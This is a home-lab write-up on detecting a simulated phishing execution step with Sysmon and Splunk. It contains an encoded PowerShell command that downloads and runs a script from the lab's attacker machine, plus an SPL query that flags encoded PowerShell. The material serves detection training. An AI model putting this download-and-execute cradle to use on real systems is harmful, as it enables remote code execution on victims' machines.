# Live Attack 2 - Suspicious PowerShell Execution

## Overview

This lab simulates the execution phase of a phishing attack. In a real scenario, the email tricks the user into opening an attachment or clicking a link, which then triggers PowerShell to pull down and run a payload.

Actually sending phishing emails needs a mail server and risks exposure outside the lab, so this one skips straight to the phase that matters most for detection: the malicious PowerShell execution itself. That's the part a SOC analyst actually sees and reacts to — email gateways usually catch the message before it ever reaches the endpoint.

| Field | Value |
|---|---|
| Attack type | Phishing → Malicious PowerShell Execution |
| Phase simulated | Execution (step 3 of the kill chain) |
| Attacker | Kali Linux (192.168.56.105) |
| Target | Windows 10 (192.168.56.30) |
| Target user | admin |
| Event ID | Sysmon Event 1 (Process Creation) |
| MITRE ATT&CK | T1059.001 (PowerShell) |
| Status | Escalated to Tier 2 |

**Note:** steps 1 and 2 of the phishing chain — delivery and user interaction — aren't simulated here. The focus is entirely on what happens once that PowerShell command runs.

---

## Attack Simulation

### Command

```powershell
powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADAANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA
```

### Result

The encoded command decodes to a `DownloadString` call pulling a payload from 192.168.56.105. The connection itself failed since the attacker server was offline during this run, but that's beside the point — Sysmon caught the full command line regardless.

---

## Detection

### Splunk query (SPL)

```spl
index=sysmon EventCode=1 Image="*\\powershell.exe" CommandLine="*-enc*"
| table _time, host, User, ParentImage, CommandLine
| sort - _time
```

### Result

Sysmon logged the command line, parent process, and user context in full. The `-enc` flag paired with `DownloadString` is a strong enough signal on its own — this combination almost never shows up in legitimate admin work.

---

## Dashboard

Two panels were added to the SOC dashboard for this one:

- Suspicious PowerShell execution trend
- Suspicious PowerShell command details

---

## Incident Report

Full writeup, including analyst notes and the escalation decision, is in [incident-report.md](incident-report.md) (INC-2026-002).

---

Part of the [SOC Home Lab - Splunk & Sysmon](https://github.com/adiirmdhn/SOC-Home-Lab-Splunk) project.
